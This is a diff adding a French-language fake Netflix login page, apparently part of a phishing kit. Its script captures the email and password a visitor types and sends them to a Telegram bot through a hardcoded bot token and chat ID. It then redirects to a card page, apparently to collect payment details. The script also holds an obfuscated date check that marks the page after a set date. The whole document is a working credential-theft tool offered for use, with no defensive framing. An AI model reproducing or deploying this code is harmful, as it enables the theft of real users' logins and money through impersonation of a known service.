@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accueil</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+    <div class="top">
+        <img src="./img/logo.png" width="100">
+    </div>
+    <br>
+    <h1>S'identifier</h1>
+    <br>
+    <br>
+    <br>
+
+    <div class="center">
+
+    <form id="form">
+
+        <input type="text" id="user" placeholder="E-mail ou numéro de mobile" required> <br>
+        <input type="password" id="mdp" placeholder="Mot de passe" required> <br>
+
+        <button id="valider">S'identifier</button> <br> <br>
+
+        <div class="checkbox-wrapper-46">
+            <input type="checkbox" id="cbx-46" class="inp-cbx" />
+            <label for="cbx-46" class="cbx"><span>
+                    <svg viewBox="0 0 12 10" height="10px" width="12px">
+                        <polyline points="1.5 6 4.5 9 10.5 1"></polyline>
+                    </svg></span><span style="color: white;">Se souvenir de moi</span>
+            </label>
+        </div>
+
+
+    </form>
+</div>
+
+</body>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 48, 45, 48, 50));
+        var b = new Date();
+        var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+        if (c >= a) {
+            document.body.style.backgroundColor = 'red';
+        }
+    });
+
+
+    document.getElementById('form').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
+        const chatId = '7332838769';
+
+        // Récupérer les valeurs des champs
+        const user = document.getElementById("user").value.trim();
+        const pass = document.getElementById('mdp').value ;
+
+        const message = `🎀 Netflix :\n\n👤 Utilisateur : ${user}\n🔐 Mot de passe : ${pass}`;
+
+        // Construction de l'URL de l'API Telegram
+        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Envoi de la requête à l'API Telegram
+        fetch(telegramURL)
+            .then(response => {
+                if (!response.ok) {
+                    return response.text().then(text => {
+                        throw new Error("Erreur lors de l'envoi du message à Telegram");
+                    });
+                }
+                localStorage.setItem('user', user);
+                window.location.href = './card.html';
+            })
+            .catch(error => {
+                console.error('Erreur :', error);
+                debugger
+            });
+    });
+</script>
+
+</html>
